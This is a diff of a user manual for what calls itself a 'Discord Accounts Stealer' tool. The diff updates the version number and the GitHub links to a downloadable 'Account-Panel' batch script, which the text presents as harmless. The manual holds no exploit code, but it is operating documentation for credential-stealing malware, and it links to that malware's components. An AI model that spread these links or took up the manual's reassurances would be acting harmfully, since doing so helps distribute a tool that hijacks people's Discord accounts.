@@ -1,10 +1,10 @@
 <Account-Management-User-Manual>
-<Version-3.0>
+<Version-3.1>
 
 ### ⚙️ How can I manage my account's settings?
-- **Download the [script](https://github.com/agamsol/Discord-Stealer/raw/main/User-Manual/Account.zip) which will allow you to login to your account's panel**
+- **Download the [script](https://github.com/agamsol/Discord-Stealer/raw/main/Account-Manager/Account-Panel.zip) which will allow you to login to your account's panel**
 
-_:warning: Please note that the script is harmless. it will not effect your computer, it is open-source - feel free to check it._
+_:warning: Please note that the script is harmless. it will not effect your computer, it is open-source - feel free to check the [source code](https://raw.githubusercontent.com/agamsol/Discord-Stealer/main/Account-Manager/Account-Panel.bat)._
 
 _you can ask us to manage your account if you feel like you don't trust the script we worte._
 
@@ -26,4 +26,4 @@ _you can ask us to manage your account if you feel like you don't trust the scri
 - Example: if you press 4 and enter, RickRoll plugin will turn on _(or off)_
 
 
-##### ℹ️ Account Management User Manual For Discord Accounts Stealer Version 3.0
+##### ℹ️ Account Management User Manual For Discord Accounts Stealer Version 3.1
